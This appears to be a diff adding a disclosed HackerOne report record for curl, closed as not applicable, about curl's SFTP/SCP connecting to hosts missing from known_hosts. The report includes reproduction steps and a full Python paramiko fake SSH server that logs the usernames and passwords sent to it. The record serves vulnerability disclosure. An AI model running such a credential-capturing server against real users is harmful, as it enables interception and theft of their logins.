@@ -1,0 +1,123 @@
+{
+  "id": 2961050,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTYxMDUw",
+  "url": "https://hackerone.com/reports/2961050",
+  "title": "curl allows SSH connection even if host is not in known_hosts",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2025-01-27T17:30:02.270Z",
+  "submitted_at": "2025-01-27T17:30:02.608Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nyymi",
+    "url": "/nyymi",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-02-05T21:41:40.866Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-02-05T15:03:42.993Z",
+  "team_member_agreed_on_going_public_at": "2025-02-05T21:41:40.391Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nCurl does _not_ fail if the SSH host identity cannot be verified due to the host not being included in the `.ssh/known_hosts` file. This makes using curl to login into an previously unknown ssh host system vulnerable to meddler in the middle attacks. When using key based authentication it will allow a malicious host to spoof the real system, and either return tampered or otherwise malicious content on download, or capture the uploads. When using username + password authentication it will also leak the username and password to the attacker, and thus allow the attacker to connect to the intended target host. \n\nCurl does have `--insecure` option which is said to:\n\n```\n              For SFTP and SCP, this option makes curl skip the known_hosts\n              verification.  known_hosts is a file normally stored in the\n              user's home directory in the \".ssh\" subdirectory, which contains\n              hostnames and their public keys.\n```\nFrom this it would be easy to assume that omitting `--insecure` would mean that the connection is secure, that is: the connection would fail if the host identity can't be verified *or* curl would prompt the user to verify the host key similar to how SSH command does. However, this is not the case, and the connection will succeed if the host is not in the `.ssh/known_hosts` file. The current curl behaviour is similar to ssh being used with `StrictHostKeyChecking` `accept-new`.\n\nNote that while curl does warn of the issue with `Warning: Couldn't find a known_hosts file` this is too late:\n\n```\n$ curl --user foo sftp://localhost:2222\nEnter host password for user 'foo':\nWarning: Couldn't find a known_hosts file\ncurl: (67) Login denied\n```\nThe warning is issued only after the password has been requested. The username & password have already been sent to the malicious server by the time the user sees the warning:\n```\nINFO:root:[pass] Authenticated username foo password bar\n```\nThe warning also is quite useless when curl is being called from scripts as the command is not failing.\n\n## Affected version\n8.11.1\n\n## Steps To Reproduce:\n  1. `./configure --with-openssl --with-libssh` (or `--with-libssh2`)\n  2. `make`\n  3. Have no entry of targethost in `.ssh/known_hosts`file.\n  4. `(DY)LD_LIBRARY_PATH=lib/.libs src/curl  sftp://foo:bar@targethost`\n\nThe middler in the middle will obtain the credentials:\n```\nINFO:root:[pass] Authenticated username foo password bar\n```\n\n## Supporting Material/References:\n\nHere's a minimal fake SSH server dumping username & password sent to it. The server runs on port 2222.\n```\n#!/usr/bin/env python3\n\nimport paramiko.rsakey\nimport paramiko\nimport threading\nimport logging\nimport socket\n\nlogging.basicConfig(level = logging.INFO)\n\nclass SSHServer(paramiko.ServerInterface):\n    def __init__(self):\n        self.event = threading.Event()\n\n    def get_allowed_auths(self, username):\n        logging.debug('[auth] Get username {} allowed auths'.format(username))\n        return \"password,publickey,none\"\n\n    def check_auth_none(self, username):\n        logging.debug('[none] Authenticated username {}'.format(username))\n        return paramiko.AUTH_FAILED\n\n    def check_auth_password(self, username, password):\n        logging.info('[pass] Authenticated username {} password {}'.format(username, password))\n        return paramiko.AUTH_FAILED\n\nclass ClientConnection(threading.Thread):\n    def __init__(self, group = None, target = None, name = None, args = ()):\n        threading.Thread.__init__(self, group = group, target = target, name = name)\n        self.args = args\n\n    def run(self):\n        hostkey = self.args[0]\n        client = self.args[1]\n        transport = None\n        chan = None\n\n        try:\n            transport = paramiko.Transport(client)\n            try:\n                transport.load_server_moduli()\n            except:\n                pass\n\n            transport.add_server_key(hostkey)\n            server = SSHServer()\n            try:\n                transport.start_server(server=server)\n            except:\n                logging.warning('*** SSH negotiation failed, disconnect')\n                client.close()\n                return\n\n            logging.info('Full remote version: {}'.format(transport.remote_version))\n\n            chan = transport.accept(10)\n            if chan:\n                chan.close()\n            transport.close()\n\n        except Exception as e:\n            logging.info('*** Caught exception: {}: {}'.format(str(e.__class__), str(e)))\n            if chan:\n                chan.close()\n            if transport:\n                transport.close()\n            pass\n\n\ndef main():\n    hostkey = paramiko.rsakey.RSAKey.generate(1024)\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind(('', 2222))\n    sock.listen(7)\n\n    while True:\n        client, addr = sock.accept()\n        logging.info('Received connection from {}:{}'.format(addr[0], addr[1]))\n        t = ClientConnection(args = (hostkey, client,))\n        t.start()\n\nif __name__ == '__main__':\n    main()\n```\n\n  * [attachment / reference]\n\n## Impact\n\n## Summary:\n- Download of malicious content (on download).\n- Leak of confidential information (on upload).\n- Leak of credentials (if using password auth).",
+  "weakness": {
+    "id": 28,
+    "name": "Improper Certificate Validation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 11,
+  "voters": [
+    "aboalezz",
+    "zy9ard3",
+    "2026",
+    "mr-alienx-kurd",
+    "elijahwright",
+    "alexander771",
+    "labupump",
+    "sgdark91",
+    "phi_brain",
+    "adse5ty",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
